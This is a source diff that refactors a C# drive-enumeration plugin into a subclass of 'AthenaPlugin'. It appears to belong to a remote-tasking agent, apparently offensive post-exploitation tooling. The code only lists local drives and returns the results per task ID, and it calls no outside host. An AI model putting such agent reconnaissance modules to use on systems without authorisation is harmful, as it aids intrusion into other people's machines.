@@ -4,11 +4,11 @@ using System.IO;
 using System.Text;
 using PluginBase;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class drives
+    public class Plugin : AthenaPlugin
     {
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             StringBuilder output = new StringBuilder();
             output.Append("[");
@@ -19,7 +19,7 @@ namespace Plugin
                 {
                     output.Append($"{{\"DriveName\":\"{d.Name.Replace(@"\", @"\\")}\",\"DriveType\":\"{d.DriveType}\",\"FreeSpace\":\"{d.TotalFreeSpace.ToString()}\",\"TotalSpace\":\"{d.TotalSize.ToString()}\"}},");
                 }
-                catch(IOException e)
+                catch (IOException e)
                 {
                     output.Append($"{{\"DriveName\":\"{d.Name.Replace(@"\", @"\\")}\",\"DriveType\":\"{e.Message.Split(":")[0].TrimEnd(' ')}\",\"FreeSpace\":\"\",\"TotalSpace\":\"\"}},");
                 }
@@ -27,13 +27,13 @@ namespace Plugin
                 {
                     output.Append($"{{\"DriveName\":\"{d.Name.Replace(@"\", @"\\")}\",\"DriveType\":\"{e.Message.Split(":")[0].TrimEnd(' ')}\",\"FreeSpace\":\"\",\"TotalSpace\":\"\"}},");
 
-                    output.Remove(output.Length - 1, 1); 
+                    output.Remove(output.Length - 1, 1);
                     output.Append("]");
                 }
             }
             output.Remove(output.Length - 1, 1);
             output.Append("]");
-            
+
             PluginHandler.Write(output.ToString(), (string)args["task-id"], true);
         }
     }
